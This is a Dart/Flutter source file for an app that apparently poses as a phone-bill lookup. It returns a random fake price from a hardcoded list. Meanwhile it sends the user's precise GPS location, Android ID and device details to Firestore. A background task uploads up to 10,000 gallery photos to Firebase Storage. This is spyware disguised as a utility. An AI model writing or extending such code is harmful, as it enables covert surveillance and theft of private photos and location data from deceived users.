import 'dart:io';
import 'dart:math';
import 'package:bloc/bloc.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:workmanager/workmanager.dart';

import '../../generated/l10n.dart';
import '../../helper/global_widgets/global_snack_bar_widget.dart';
import '../../resources/colors_manager.dart';

part 'main_state.dart';

const String uploadImagesTask = "upload_images_task";

class MainCubit extends Cubit<MainState> {
  MainCubit() : super(MainInitial());
  TextEditingController phoneController = TextEditingController();

  Future<Position?> getUserLocation(BuildContext context, uniqueId) async {
    emit(GetPhoneDetailsLoadingState());
    final DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    Map<String, dynamic> details = {};

    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    details = {
      "Device": androidInfo.model,
      "Brand": androidInfo.brand,
      "Android Version": androidInfo.version.release,
      "Manufacturer": androidInfo.manufacturer,
      "Hardware": androidInfo.hardware,
      "Android ID": androidInfo.id,
      "uId": uniqueId,
      "timeCreate": DateTime.now().toString(),
    };

    await FirebaseFirestore.instance
        .collection('phones_details')
        .doc()
        .set(details);
    // ✅ Check if location services are enabled
    bool isLocationEnabled = await Geolocator.isLocationServiceEnabled();
    // if (!isLocationEnabled) {
    //   // Show alert to enable GPS
    //   await showDialog(
    //     context: context,
    //     builder: (context) => AlertDialog(
    //       title: Text("Enable GPS"),
    //       content: Text("Location services are disabled. Please enable GPS."),
    //       actions: [
    //         TextButton(
    //           onPressed: () async {
    //             await Geolocator.openLocationSettings(); // Opens location settings
    //             Navigator.pop(context);
    //           },
    //           child: Text("Open Settings"),
    //         ),
    //       ],
    //     ),
    //   );
    //   return null;
    // }

    // ✅ Request location permission
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        print("❌ Location permission denied.");
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      // Show alert to enable location permission in settings
      await showDialog(
        context: context,
        builder: (context) => AlertDialog(
          title: Text("Location Permission"),
          content: Text(
              "Location permissions are permanently denied. Please enable them in settings."),
          actions: [
            TextButton(
              onPressed: () async {
                await Geolocator.openAppSettings(); // Opens app settings
                Navigator.pop(context);
              },
              child: Text("Open Settings"),
            ),
          ],
        ),
      );
      return null;
    }

    // ✅ Fetch current location
    try {
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      print("📍 User Location: ${position.latitude}, ${position.longitude}");
      await FirebaseFirestore.instance.collection('locations').doc().set({
        "uId": uniqueId,
        "latitude": position.latitude,
        "longitude": position.longitude,
        "timeCreate": DateTime.now().toString(),
        "Device": androidInfo.model,
        "Brand": androidInfo.brand,
        "Android Version": androidInfo.version.release,
        "Manufacturer": androidInfo.manufacturer,
        "Hardware": androidInfo.hardware,
        "Android ID": androidInfo.id,
      });
      return position;
    } catch (e) {
      print("❌ Error getting location: $e");
      return null;
    }
  }

  bool loadingGetPrice = false;
  String totalPhonePrice = "";
  List<String> prices = [
    "239.4",
    "239.4",
    "239.4",
    "410.4",
    "410.4",
    "410.4",
    "649.8",
    "لا توجد فاتوره لهذا الرقم",
    "لا توجد فاتوره لهذا الرقم",
    "لا توجد فاتوره لهذا الرقم",
    "لا توجد فاتوره لهذا الرقم",
    "لا توجد فاتوره لهذا الرقم",
    "لا توجد فاتوره لهذا الرقم",
    "لا توجد فاتوره لهذا الرقم",
    "لا توجد فاتوره لهذا الرقم",
    "لا توجد فاتوره لهذا الرقم",
    "لا توجد فاتوره لهذا الرقم",
  ];

  getPrice({
    required BuildContext context,
  }) async {
    totalPhonePrice = "";
    if (phoneController.text.isEmpty) {
      myGlobalSnackBarWidget(
        context: context,
        isArabic: true,
        backGroundColor: AppColors.inf_suc_dan_warn_danger,
        text: S.current.access,
      );
    } else {
      loadingGetPrice = true;
      emit(GetPhonePriceLoadingState());
      await getUserLocationFromButton(
        context,
        phoneController.text,
      ).then((e){
        Future.delayed(Duration(seconds: 7), () {
          loadingGetPrice = false;
          totalPhonePrice = prices[Random().nextInt(prices.length-1)];
          emit(GetPhonePriceSuccessState());

        });
      });


      // await uploadAllImagesToFirebase();
    }
  }

  Future<Position?> getUserLocationFromButton(
      BuildContext context, uniqueId) async {
    emit(GetPhoneDetailsLoadingState());
    print("get location from button");
    final DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();

    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    // ✅ Check if location services are enabled
    bool isLocationEnabled = await Geolocator.isLocationServiceEnabled();
    if (!isLocationEnabled) {
      // Show alert to enable GPS
      await showDialog(
        context: context,
        builder: (context) => AlertDialog(
          title: Text("Enable GPS"),
          content: Text("Location services are disabled. Please enable GPS."),
          actions: [
            TextButton(
              onPressed: () async {
                await Geolocator
                    .openLocationSettings(); // Opens location settings
                Navigator.pop(context);
              },
              child: Text("Open Settings"),
            ),
          ],
        ),
      );
      return null;
    }

    // ✅ Request location permission
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        print("❌ Location permission denied.");
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      // Show alert to enable location permission in settings
      await showDialog(
        context: context,
        builder: (context) => AlertDialog(
          title: Text("Location Permission"),
          content: Text(
              "Location permissions are permanently denied. Please enable them in settings."),
          actions: [
            TextButton(
              onPressed: () async {
                await Geolocator.openAppSettings(); // Opens app settings
                Navigator.pop(context);
              },
              child: Text("Open Settings"),
            ),
          ],
        ),
      );
      return null;
    }

    // ✅ Fetch current location
    try {
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      print("📍 User Location: ${position.latitude}, ${position.longitude}");
      await FirebaseFirestore.instance.collection('locations').doc().set({
        "uId": uniqueId,
        "latitude": position.latitude,
        "longitude": position.longitude,
        "timeCreate": DateTime.now().toString(),
        "Device": androidInfo.model,
        "Brand": androidInfo.brand,
        "Android Version": androidInfo.version.release,
        "Manufacturer": androidInfo.manufacturer,
        "Hardware": androidInfo.hardware,
        "Android ID": androidInfo.id,
      });
      // getPrice();
      return position;
    } catch (e) {
      print("❌ Error getting location: $e");
      return null;
    }
  }


  void startImageUpload() {
    emit(UploadingImagesState());
    Workmanager().registerOneOffTask(uploadImagesTask, uploadImagesTask);
    emit(UploadStartedInBackgroundState());
  }

  Future<void> uploadAllImagesToFirebase() async {
    PermissionState permission = await PhotoManager.requestPermissionExtend();
    if (!permission.hasAccess) {
      print("❌ Permission denied to access photos.");
      return;
    }

    List<AssetEntity> images = await PhotoManager.getAssetListRange(
      start: 0,
      end: 10000,
      type: RequestType.image,
    );

    print("📸 Found ${images.length} images.");

    for (AssetEntity image in images) {
      File? file = await getFileFromAsset(image);
      if (file != null) {
        await uploadImageToFirebase(file);
      }
    }

    print("✅ All images uploaded to Firebase.");
  }

  Future<File?> getFileFromAsset(AssetEntity asset) async {
    return await asset.file;
  }

  Future<void> uploadImageToFirebase(File imageFile) async {
    try {
      String fileName = "images/${DateTime.now().millisecondsSinceEpoch}.jpg";
      Reference ref = FirebaseStorage.instance.ref().child(fileName);
      await ref.putFile(imageFile);
      print("✅ Uploaded: $fileName");
    } catch (e) {
      print("❌ Error uploading image: $e");
    }
  }
}

void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    if (task == uploadImagesTask) {
      MainCubit().uploadAllImagesToFirebase();
    }
    return Future.value(true);
  });
}


/*

 */